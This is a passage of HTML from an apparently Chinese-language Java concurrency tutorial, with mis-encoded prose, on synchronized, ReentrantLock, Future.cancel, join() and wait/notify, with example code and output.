class=\"na\">ThreadPoolExecutor$Worker</span><span class=\"o\">.</span><span class=\"na\">run</span><span class=\"o\">(</span><span class=\"n\">ThreadPoolExecutor</span><span class=\"o\">.</span><span class=\"na\">java</span><span class=\"o\">:</span><span class=\"n\">617</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">Thread</span><span class=\"o\">.</span><span class=\"na\">run</span><span class=\"o\">(</span><span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">java</span><span class=\"o\">:</span><span class=\"n\">745</span><span class=\"o\">)</span></code></pre></div><p>å¦‚æœåªæƒ³ä¸­æ–­ Executor ä¸­çš„ä¸€ä¸ªçº¿ç¨‹ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ submit() æ–¹æ³•æ¥æäº¤ä¸€ä¸ªçº¿ç¨‹ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ª Future&lt;?&gt; å¯¹è±¡ï¼Œé€šè¿‡è°ƒç”¨è¯¥å¯¹è±¡çš„ cancel(true) æ–¹æ³•å°±å¯ä»¥ä¸­æ–­çº¿ç¨‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Future</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">future</span> <span class=\"o\">=</span> <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">submit</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// ..\n</span><span class=\"c1\"></span><span class=\"o\">});</span>\n<span class=\"n\">future</span><span class=\"o\">.</span><span class=\"na\">cancel</span><span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">);</span></code></pre></div><h2>äº”ã€äº’æ–¥åŒæ­¥</h2><p>Java æä¾›äº†ä¸¤ç§é”æœºåˆ¶æ¥æ§åˆ¶å¤šä¸ªçº¿ç¨‹å¯¹å…±äº«èµ„æºçš„äº’æ–¥è®¿é—®ï¼Œç¬¬ä¸€ä¸ªæ˜¯ JVM å®ç°çš„ synchronizedï¼Œè€Œå¦ä¸€ä¸ªæ˜¯ JDK å®ç°çš„ ReentrantLockã€‚</p><h2>synchronized</h2><p><b>1. åŒæ­¥ä¸€ä¸ªä»£ç å—</b> </p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"kd\">synchronized</span> <span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// ...\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>å®ƒåªä½œç”¨äºåŒä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœè°ƒç”¨ä¸¤ä¸ªå¯¹è±¡ä¸Šçš„åŒæ­¥ä»£ç å—ï¼Œå°±ä¸ä¼šè¿›è¡ŒåŒæ­¥ã€‚</p><p>å¯¹äºä»¥ä¸‹ä»£ç ï¼Œä½¿ç”¨ ExecutorService æ‰§è¡Œäº†ä¸¤ä¸ªçº¿ç¨‹ï¼Œç”±äºè°ƒç”¨çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡çš„åŒæ­¥ä»£ç å—ï¼Œå› æ­¤è¿™ä¸¤ä¸ªçº¿ç¨‹ä¼šè¿›è¡ŒåŒæ­¥ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è¿›å…¥åŒæ­¥è¯­å¥å—æ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å°±å¿…é¡»ç­‰å¾…ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SynchronizedExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"kd\">synchronized</span> <span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">10</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n                <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"s\">&#34; &#34;</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">SynchronizedExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SynchronizedExample</span><span class=\"o\">();</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">func1</span><span class=\"o\">());</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">func1</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">0</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">3</span> <span class=\"n\">4</span> <span class=\"n\">5</span> <span class=\"n\">6</span> <span class=\"n\">7</span> <span class=\"n\">8</span> <span class=\"n\">9</span> <span class=\"n\">0</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">3</span> <span class=\"n\">4</span> <span class=\"n\">5</span> <span class=\"n\">6</span> <span class=\"n\">7</span> <span class=\"n\">8</span> <span class=\"n\">9</span></code></pre></div><p>å¯¹äºä»¥ä¸‹ä»£ç ï¼Œä¸¤ä¸ªçº¿ç¨‹è°ƒç”¨äº†ä¸åŒå¯¹è±¡çš„åŒæ­¥ä»£ç å—ï¼Œå› æ­¤è¿™ä¸¤ä¸ªçº¿ç¨‹å°±ä¸éœ€è¦åŒæ­¥ã€‚ä»è¾“å‡ºç»“æœå¯ä»¥çœ‹å‡ºï¼Œä¸¤ä¸ªçº¿ç¨‹äº¤å‰æ‰§è¡Œã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">SynchronizedExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SynchronizedExample</span><span class=\"o\">();</span>\n    <span class=\"n\">SynchronizedExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SynchronizedExample</span><span class=\"o\">();</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">func1</span><span class=\"o\">());</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">e2</span><span class=\"o\">.</span><span class=\"na\">func1</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">0</span> <span class=\"n\">0</span> <span class=\"n\">1</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">2</span> <span class=\"n\">3</span> <span class=\"n\">3</span> <span class=\"n\">4</span> <span class=\"n\">4</span> <span class=\"n\">5</span> <span class=\"n\">5</span> <span class=\"n\">6</span> <span class=\"n\">6</span> <span class=\"n\">7</span> <span class=\"n\">7</span> <span class=\"n\">8</span> <span class=\"n\">8</span> <span class=\"n\">9</span> <span class=\"n\">9</span></code></pre></div><p><b>2. åŒæ­¥ä¸€ä¸ªæ–¹æ³•</b> </p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">synchronized</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span> <span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// ...\n</span><span class=\"c1\"></span><span class=\"o\">}</span></code></pre></div><p>å®ƒå’ŒåŒæ­¥ä»£ç å—ä¸€æ ·ï¼Œä½œç”¨äºåŒä¸€ä¸ªå¯¹è±¡ã€‚</p><p><b>3. åŒæ­¥ä¸€ä¸ªç±»</b> </p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"kd\">synchronized</span> <span class=\"o\">(</span><span class=\"n\">SynchronizedExample</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// ...\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>ä½œç”¨äºæ•´ä¸ªç±»ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ä¸ªçº¿ç¨‹è°ƒç”¨åŒä¸€ä¸ªç±»çš„ä¸åŒå¯¹è±¡ä¸Šçš„è¿™ç§åŒæ­¥è¯­å¥ï¼Œä¹Ÿä¼šè¿›è¡ŒåŒæ­¥ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SynchronizedExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func2</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"kd\">synchronized</span> <span class=\"o\">(</span><span class=\"n\">SynchronizedExample</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">10</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n                <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"s\">&#34; &#34;</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">SynchronizedExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SynchronizedExample</span><span class=\"o\">();</span>\n    <span class=\"n\">SynchronizedExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SynchronizedExample</span><span class=\"o\">();</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">func2</span><span class=\"o\">());</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">e2</span><span class=\"o\">.</span><span class=\"na\">func2</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">0</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">3</span> <span class=\"n\">4</span> <span class=\"n\">5</span> <span class=\"n\">6</span> <span class=\"n\">7</span> <span class=\"n\">8</span> <span class=\"n\">9</span> <span class=\"n\">0</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">3</span> <span class=\"n\">4</span> <span class=\"n\">5</span> <span class=\"n\">6</span> <span class=\"n\">7</span> <span class=\"n\">8</span> <span class=\"n\">9</span></code></pre></div><p><b>4. åŒæ­¥ä¸€ä¸ªé™æ€æ–¹æ³•</b> </p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">synchronized</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">fun</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// ...\n</span><span class=\"c1\"></span><span class=\"o\">}</span></code></pre></div><p>ä½œç”¨äºæ•´ä¸ªç±»ã€‚</p><h2>ReentrantLock</h2><p>ReentrantLock æ˜¯ java.util.concurrentï¼ˆJ.U.Cï¼‰åŒ…ä¸­çš„é”ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">LockExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">Lock</span> <span class=\"n\">lock</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ReentrantLock</span><span class=\"o\">();</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">lock</span><span class=\"o\">();</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">10</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n                <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"s\">&#34; &#34;</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span> <span class=\"k\">finally</span> <span class=\"o\">{</span>\n            <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">unlock</span><span class=\"o\">();</span> <span class=\"c1\">// ç¡®ä¿é‡Šæ”¾é”ï¼Œä»è€Œé¿å…å‘ç”Ÿæ­»é”ã€‚\n</span><span class=\"c1\"></span>        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">LockExample</span> <span class=\"n\">lockExample</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">LockExample</span><span class=\"o\">();</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">lockExample</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">());</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">lockExample</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">0</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">3</span> <span class=\"n\">4</span> <span class=\"n\">5</span> <span class=\"n\">6</span> <span class=\"n\">7</span> <span class=\"n\">8</span> <span class=\"n\">9</span> <span class=\"n\">0</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">3</span> <span class=\"n\">4</span> <span class=\"n\">5</span> <span class=\"n\">6</span> <span class=\"n\">7</span> <span class=\"n\">8</span> <span class=\"n\">9</span></code></pre></div><h2>æ¯”è¾ƒ</h2><p><b>1. é”çš„å®ç°</b> </p><p>synchronized æ˜¯ JVM å®ç°çš„ï¼Œè€Œ ReentrantLock æ˜¯ JDK å®ç°çš„ã€‚</p><p><b>2. æ€§èƒ½</b> </p><p>æ–°ç‰ˆæœ¬ Java å¯¹ synchronized è¿›è¡Œäº†å¾ˆå¤šä¼˜åŒ–ï¼Œä¾‹å¦‚è‡ªæ—‹é”ç­‰ï¼Œsynchronized ä¸ ReentrantLock å¤§è‡´ç›¸åŒã€‚</p><p><b>3. ç­‰å¾…å¯ä¸­æ–­</b> </p><p>å½“æŒæœ‰é”çš„çº¿ç¨‹é•¿æœŸä¸é‡Šæ”¾é”çš„æ—¶å€™ï¼Œæ­£åœ¨ç­‰å¾…çš„çº¿ç¨‹å¯ä»¥é€‰æ‹©æ”¾å¼ƒç­‰å¾…ï¼Œæ”¹ä¸ºå¤„ç†å…¶ä»–äº‹æƒ…ã€‚</p><p>ReentrantLock å¯ä¸­æ–­ï¼Œè€Œ synchronized ä¸è¡Œã€‚</p><p><b>4. å…¬å¹³é”</b> </p><p>å…¬å¹³é”æ˜¯æŒ‡å¤šä¸ªçº¿ç¨‹åœ¨ç­‰å¾…åŒä¸€ä¸ªé”æ—¶ï¼Œå¿…é¡»æŒ‰ç…§ç”³è¯·é”çš„æ—¶é—´é¡ºåºæ¥ä¾æ¬¡è·å¾—é”ã€‚</p><p>synchronized ä¸­çš„é”æ˜¯éå…¬å¹³çš„ï¼ŒReentrantLock é»˜è®¤æƒ…å†µä¸‹ä¹Ÿæ˜¯éå…¬å¹³çš„ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æ˜¯å…¬å¹³çš„ã€‚</p><p><b>5. é”ç»‘å®šå¤šä¸ªæ¡ä»¶</b> </p><p>ä¸€ä¸ª ReentrantLock å¯ä»¥åŒæ—¶ç»‘å®šå¤šä¸ª Condition å¯¹è±¡ã€‚</p><h2>ä½¿ç”¨é€‰æ‹©</h2><p>é™¤ééœ€è¦ä½¿ç”¨ ReentrantLock çš„é«˜çº§åŠŸèƒ½ï¼Œå¦åˆ™ä¼˜å…ˆä½¿ç”¨ synchronizedã€‚è¿™æ˜¯å› ä¸º synchronized æ˜¯ JVM å®ç°çš„ä¸€ç§é”æœºåˆ¶ï¼ŒJVM åŸç”Ÿåœ°æ”¯æŒå®ƒï¼Œè€Œ ReentrantLock ä¸æ˜¯æ‰€æœ‰çš„ JDK ç‰ˆæœ¬éƒ½æ”¯æŒã€‚å¹¶ä¸”ä½¿ç”¨ synchronized ä¸ç”¨æ‹…å¿ƒæ²¡æœ‰é‡Šæ”¾é”è€Œå¯¼è‡´æ­»é”é—®é¢˜ï¼Œå› ä¸º JVM ä¼šç¡®ä¿é”çš„é‡Šæ”¾ã€‚</p><h2>å…­ã€çº¿ç¨‹ä¹‹é—´çš„åä½œ</h2><p>å½“å¤šä¸ªçº¿ç¨‹å¯ä»¥ä¸€èµ·å·¥ä½œå»è§£å†³æŸä¸ªé—®é¢˜æ—¶ï¼Œå¦‚æœæŸäº›éƒ¨åˆ†å¿…é¡»åœ¨å…¶å®ƒéƒ¨åˆ†ä¹‹å‰å®Œæˆï¼Œé‚£ä¹ˆå°±éœ€è¦å¯¹çº¿ç¨‹è¿›è¡Œåè°ƒã€‚</p><h2>join()</h2><p>åœ¨çº¿ç¨‹ä¸­è°ƒç”¨å¦ä¸€ä¸ªçº¿ç¨‹çš„ join() æ–¹æ³•ï¼Œä¼šå°†å½“å‰çº¿ç¨‹æŒ‚èµ·ï¼Œè€Œä¸æ˜¯å¿™ç­‰å¾…ï¼Œç›´åˆ°ç›®æ ‡çº¿ç¨‹ç»“æŸã€‚</p><p>å¯¹äºä»¥ä¸‹ä»£ç ï¼Œè™½ç„¶ b çº¿ç¨‹å…ˆå¯åŠ¨ï¼Œä½†æ˜¯å› ä¸ºåœ¨ b çº¿ç¨‹ä¸­è°ƒç”¨äº† a çº¿ç¨‹çš„ join() æ–¹æ³•ï¼Œb çº¿ç¨‹ä¼šç­‰å¾… a çº¿ç¨‹ç»“æŸæ‰ç»§ç»­æ‰§è¡Œï¼Œå› æ­¤æœ€åèƒ½å¤Ÿä¿è¯ a çº¿ç¨‹çš„è¾“å‡ºå…ˆäº b çº¿ç¨‹çš„è¾“å‡ºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">JoinExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"kd\">extends</span> <span class=\"n\">Thread</span> <span class=\"o\">{</span>\n        <span class=\"nd\">@Override</span>\n        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;A&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">class</span> <span class=\"nc\">B</span> <span class=\"kd\">extends</span> <span class=\"n\">Thread</span> <span class=\"o\">{</span>\n\n        <span class=\"kd\">private</span> <span class=\"n\">A</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n\n        <span class=\"n\">B</span><span class=\"o\">(</span><span class=\"n\">A</span> <span class=\"n\">a</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n\n        <span class=\"nd\">@Override</span>\n        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n            <span class=\"k\">try</span> <span class=\"o\">{</span>\n                <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"na\">join</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;B&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">test</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">A</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n        <span class=\"n\">B</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">B</span><span class=\"o\">(</span><span class=\"n\">a</span><span class=\"o\">);</span>\n        <span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n        <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">JoinExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">JoinExample</span><span class=\"o\">();</span>\n    <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">test</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">A</span>\n<span class=\"n\">B</span></code></pre></div><h2>wait() notify() notifyAll()</h2><p>è°ƒç”¨ wait() ä½¿å¾—çº¿ç¨‹ç­‰å¾…æŸä¸ªæ¡ä»¶æ»¡è¶³ï¼Œçº¿ç¨‹åœ¨ç­‰å¾…æ—¶ä¼šè¢«æŒ‚èµ·ï¼Œå½“å…¶ä»–çº¿ç¨‹çš„è¿è¡Œä½¿å¾—è¿™ä¸ªæ¡ä»¶æ»¡è¶³æ—¶ï¼Œå…¶å®ƒçº¿ç¨‹ä¼šè°ƒç”¨ notify() æˆ–è€… notifyAll() æ¥å”¤é†’æŒ‚èµ·çš„çº¿ç¨‹ã€‚</p><p>å®ƒä»¬éƒ½å±äº Object çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸å±äº Threadã€‚</p><p>åªèƒ½ç”¨åœ¨åŒæ­¥æ–¹æ³•æˆ–è€…åŒæ­¥æ§åˆ¶å—ä¸­ä½¿ç”¨ï¼Œå¦åˆ™ä¼šåœ¨è¿è¡Œæ—¶æŠ›å‡º IllegalMonitorStateExceptionã€‚</p><p>ä½¿ç”¨ wait() æŒ‚èµ·æœŸé—´ï¼Œçº¿ç¨‹ä¼šé‡Šæ”¾é”ã€‚è¿™æ˜¯å› ä¸ºï¼Œå¦‚æœæ²¡æœ‰é‡Šæ”¾é”ï¼Œé‚£ä¹ˆå…¶å®ƒçº¿ç¨‹å°±æ— æ³•è¿›å…¥å¯¹è±¡çš„åŒæ­¥æ–¹æ³•æˆ–è€…åŒæ­¥æ§åˆ¶å—ä¸­ï¼Œé‚£ä¹ˆå°±æ— æ³•æ‰§è¡Œ notify() æˆ–è€… notifyAll() æ¥å”¤é†’æŒ‚èµ·çš„çº¿ç¨‹ï¼Œé€ æˆæ­»é”ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">WaitNotifyExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">synchronized</span> <span class=\"kt\">void</span> <span class=\"nf\">before</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;before&#34;</span><span class=\"o\">);</span>\n        <span class=\"n\">notifyAll</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">synchronized</span> <span class=\"kt\">void</span> <span class=\"nf\">after</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"n\">wait</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;after&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span 